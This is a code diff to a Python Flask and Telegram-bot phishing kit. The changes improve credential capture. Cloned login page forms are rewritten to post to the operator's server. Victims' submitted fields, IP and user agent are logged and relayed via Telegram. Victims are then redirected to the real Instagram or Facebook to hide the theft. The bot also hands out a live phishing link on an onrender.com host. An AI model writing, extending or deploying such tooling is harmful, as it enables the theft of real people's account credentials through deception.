@@ -1,5 +1,5 @@
 # Import necessary libraries
-from flask import Flask, request, send_from_directory
+from flask import Flask, request, send_from_directory, redirect
 import threading
 import telebot
 from telebot import types
@@ -44,13 +44,14 @@ TEMPLATES_DIR = "Templates"
 def get_available_templates():
     templates = []
     # Look for all directories in the Templates folder
-    template_dirs = [d for d in os.listdir(TEMPLATES_DIR)
-                     if os.path.isdir(os.path.join(TEMPLATES_DIR, d))]
+    if os.path.exists(TEMPLATES_DIR):
+        template_dirs = [d for d in os.listdir(TEMPLATES_DIR)
+                         if os.path.isdir(os.path.join(TEMPLATES_DIR, d))]
 
-    for template in template_dirs:
-        # Check if the template has an index.html file
-        if os.path.exists(os.path.join(TEMPLATES_DIR, template, "index.html")):
-            templates.append(template)
+        for template in template_dirs:
+            # Check if the template has an index.html file
+            if os.path.exists(os.path.join(TEMPLATES_DIR, template, "index.html")):
+                templates.append(template)
 
     return templates
 
@@ -90,15 +91,20 @@ def serve_phish_page(user_id):
 
 
 # Route to handle form submissions from phishing pages
-@app.route('/submit/<user_id>', methods=['POST'])
+# Updated to handle both GET and POST methods
+@app.route('/submit/<user_id>', methods=['GET', 'POST'])
 def capture_creds(user_id):
     # Extract all form fields submitted by victim
-    creds = request.form.to_dict()
+    if request.method == 'POST':
+        creds = request.form.to_dict()
+    else:  # GET method
+        creds = request.args.to_dict()
 
     # Add timestamp and IP for tracking
     creds['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     creds['ip'] = request.remote_addr
     creds['user_agent'] = request.headers.get('User-Agent', 'Unknown')
+    creds['method'] = request.method
 
     # Format credentials as text for Telegram message
     msg = "\n".join(f"{k}: {v}" for k, v in creds.items())
@@ -112,8 +118,14 @@ def capture_creds(user_id):
     # Save credentials to JSON file
     save_credentials(user_id, creds)
 
-    # Response to victim's browser
-    return "✅ Credentials submitted."
+    # Response to victim's browser - redirect to a common site
+    redirect_url = "https://www.instagram.com"
+    if "instagram" in creds.get('template', '').lower():
+        redirect_url = "https://www.instagram.com"
+    elif "facebook" in creds.get('template', '').lower():
+        redirect_url = "https://www.facebook.com"
+
+    return redirect(redirect_url)
 
 
 # Function to save credentials to JSON file
@@ -243,8 +255,12 @@ def handle_template_selection(message):
                 elif os.path.isdir(src):
                     shutil.copytree(src, dst, dirs_exist_ok=True)
 
-            # Modify the HTML to include the user_id in form action
-            if modify_html_form(f"{output_path}/index.html", user_id):
+            # Add template info to track which form was used
+            with open(f"{output_path}/template_info.txt", 'w') as f:
+                f.write(template)
+
+            # Modify the HTML to include the user_id in form action and preserve method
+            if modify_html_form(f"{output_path}/index.html", user_id, template):
                 phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
                 bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
             else:
@@ -255,30 +271,61 @@ def handle_template_selection(message):
         bot.send_message(message.chat.id, f"❌ Template '{template}' not found.")
 
 
-# Function to modify HTML file to include user_id in form action
-def modify_html_form(html_path, user_id):
+# Updated function to modify HTML file to keep the form method and add user_id to action
+def modify_html_form(html_path, user_id, template_name):
     try:
-        with open(html_path, 'r', encoding='utf-8') as f:
+        with open(html_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
 
         # More robust form detection and modification
-        # Look for form elements with action attributes
-        form_pattern = re.compile(r'<form.*?action=["\'](.*?)["\']', re.IGNORECASE | re.DOTALL)
+        # First, try to find forms with method and action
+        form_pattern = re.compile(r'<form.*?method=["\'](.*?)["\'].*?action=["\'](.*?)["\']', re.IGNORECASE | re.DOTALL)
+        form_matches = form_pattern.findall(content)
 
-        if form_pattern.search(content):
-            # Replace form action with our submission URL
-            modified = form_pattern.sub(f'<form action="/submit/{user_id}"', content)
+        if form_matches:
+            # Replace form action but keep the original method
+            for method, action in form_matches:
+                # Keep original method but replace action
+                content = content.replace(
+                    f'method="{method}" action="{action}"',
+                    f'method="{method}" action="/submit/{user_id}"'
+                )
+                content = content.replace(
+                    f"method='{method}' action='{action}'",
+                    f"method='{method}' action='/submit/{user_id}'"
+                )
         else:
-            # If no form with action found, look for any form and add action
-            form_pattern = re.compile(r'<form', re.IGNORECASE)
-            if form_pattern.search(content):
-                modified = form_pattern.sub(f'<form action="/submit/{user_id}"', content)
+            # Look for forms with just method
+            method_pattern = re.compile(r'<form.*?method=["\'](.*?)["\']', re.IGNORECASE)
+            method_matches = method_pattern.findall(content)
+
+            if method_matches:
+                for method in method_matches:
+                    content = content.replace(
+                        f'method="{method}"',
+                        f'method="{method}" action="/submit/{user_id}"'
+                    )
+                    content = content.replace(
+                        f"method='{method}'",
+                        f"method='{method}' action='/submit/{user_id}'"
+                    )
             else:
-                logger.warning(f"No form found in {html_path}")
-                return False
+                # If no form with method found, look for any form
+                form_pattern = re.compile(r'<form', re.IGNORECASE)
+                if form_pattern.search(content):
+                    content = form_pattern.sub(f'<form method="post" action="/submit/{user_id}"', content)
+                else:
+                    logger.warning(f"No form found in {html_path}")
+                    return False
+
+        # Add a hidden field to track which template was used
+        form_end_pattern = re.compile(r'</form>', re.IGNORECASE)
+        if form_end_pattern.search(content):
+            content = form_end_pattern.sub(f'<input type="hidden" name="template" value="{template_name}"></form>',
+                                           content)
 
         with open(html_path, 'w', encoding='utf-8') as f:
-            f.write(modified)
+            f.write(content)
         return True
     except Exception as e:
         logger.error(f"Error modifying HTML: {e}")
